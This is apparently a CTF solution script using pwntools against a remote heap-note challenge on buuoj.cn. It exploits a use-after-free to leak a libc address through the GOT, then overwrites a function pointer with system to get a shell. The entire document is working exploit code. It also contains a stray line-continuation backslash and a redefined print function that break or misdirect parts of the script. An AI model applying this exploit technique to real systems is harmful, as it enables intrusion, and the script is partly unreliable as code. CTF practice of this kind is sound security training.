from pwn import *
from LibcSearcher import *
context(arch='i386', log_level='debug')
# io = process('./pwn')
io = remote('node4.buuoj.cn', 26342)
elf = ELF('./pwn')

def add(size, content):
    io.sendlineafter(b'Your choice :', b'1')
    io.sendlineafter(b'Note size :', str(size).encode())
    io.sendafter(b'Content :', content)

def delete(index):
    io.sendlineafter(b'Your choice :', b'2')
    io.sendlineafter(b'Index :', str(index).encode())

def print(index):
    io.sendlineafter(b'Your choice :', b'3')
    io.sendlineafter(b'Index :', str(index).encode())

add(0x20, b'/bin/sh')
add(0x20, b'colin')
delete(0)
delete(1)
add(0x8, p32(0x804862B) + p32(elf.got['puts']))
print(0)
puts = u32(io.recv(4))
print(hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
sys = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')\
delete(2)
add(0x8, p32(sys) + b'||sh')
print(0)
io.interactive()
